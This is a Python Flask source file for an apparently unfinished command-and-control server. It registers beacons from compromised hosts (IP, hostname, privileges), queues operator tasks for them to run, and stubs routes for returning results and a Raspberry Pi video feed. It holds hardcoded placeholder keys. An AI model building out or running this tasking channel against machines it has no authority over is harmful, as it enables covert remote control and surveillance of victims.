from flask import Flask, request, jsonify
from time import time
import ssl
import os
from agent import Agent
from werkzeug.exceptions import BadRequest

app = Flask(__name__)

# Define the db in the future, for now we hardcode it and test
db_name = "monke"
db_id = "1"
db_key= "xyz"
db_config = "10"

agents= Agent(
    name=db_name,
    id= db_id,
    key=db_key,
    path= f"/home/exe/agents/{db_name.lower()}",      #Make sure to add a function to create the path on initial server load
    config= db_config

)

def initial_setup():
    base_data_path = "../../data"
    subdirectories = ["beacon", "tasks", "logs"]

    if not os.path.exists (base_data_path):
        os.makedirs(base_data_path, "/beacon", "/tasks")

        for subdir in subdirectories:
            full_path = os.path.join(base_data_path, subdir)
            os.makedirs(full_path, exist_ok=True)
            print(f"[+]Created directories: {full_path}")


# Root webPath
@app.route("/")
def web_root():
    return "<p>Hello!</p>"

# Initial beacon register, beacon returns 2 or 3 arguments
@app.route("/c2/register_beacon", methods=['POST'])
def register_beacon_route():
    beacon_path = os.path.join(agents.get_beacon_path(), "beacon")

    try:
        data = request.json
        if not data:
             raise BadRequest("No JSON data provided")   #Handle invalid data
        
        remote_ip = data.get('remote_ip')
        remote_hostname = data.get ('remote_hostname')
        current_permission = data.get ('remote_permissions')

        if not all([remote_ip, remote_hostname, current_permission]):
            return jsonify({"Message": "Some data is missing"}), 400

    except BadRequest as e:
        return jsonify({"Error": f"Invalid JSON data: {str(e)}"}), 400
            
        #Write data to DB here ------------------------

    try:
        with open(beacon_path, "a") as f:
            f.write(f"{remote_hostname},{remote_ip},{current_permission}\n")
    except PermissionError:
        return jsonify({"Error": "Permission denied while writing beacon data"}), 403
    except FileNotFoundError:
        return jsonify({"Error": "Beacon file path not found"}), 404
    except OSError as e:  # Catches other OS-related errors
        return jsonify({"Error": f"Failed to write beacon data: {str(e)}"}), 500

    return jsonify({"message": "Beacon registered succesfully"}), 200

# Beacon reads from this endpoint, server writes the data to file and endpoint reflects it
@app.route("/c2/read_task", methods=['GET'])
def read_task_route():
    return Agent.read_task(agents)

# Operator writes tasks and commands to this endpoint
@app.route ("/c2/write_task", methods=['POST'])
def write_task_route():
    task = request.json.get('task')
    print("Task")
    if not task:
        return jsonify({"Error": "No task provided"}), 400  
    
    reflected_output = agents.write_task(task)
    return jsonify({"message": reflected_output}), 200

# Beacon writes data to this endpoint
@app.route ("/c2/return_execution_data", methods= ['POST'])
def randomshit():
    pass

# Route for PI functions
@app.route ("/c2/write_pi_task", methods= ['GET'])
def pistuff1():
    pass

# Route for returning PI functions
@app.route ("/c2/return_pi_execution_data", methods= ['POST'])
def pistuff2():
    pass

# Route for streaming video feed
@app.route("/c2/pi_video_feed")
def video_feed():
    pass


if __name__ == '__main__':

    base_data_path = "../../data"
    subdirectories = ["beacon", "tasks", "logs"]

    if not os.path.exists(base_data_path) or any(not os.path.exists(os.path.join(base_data_path, subdir)) for subdir in subdirectories):
         print("[!] Creating directories . . . ")
         initial_setup()

  #  cert_file = '/path/to/file'
   # key_file = '/path/to/key'

    #context = ssl.SSLContext(ssl.PROTOCOL_TLS)
    #context.load_cert_chain(certfile=cert_file, keyfile=key_file)

    app.run(host='0.0.0.0', port=80)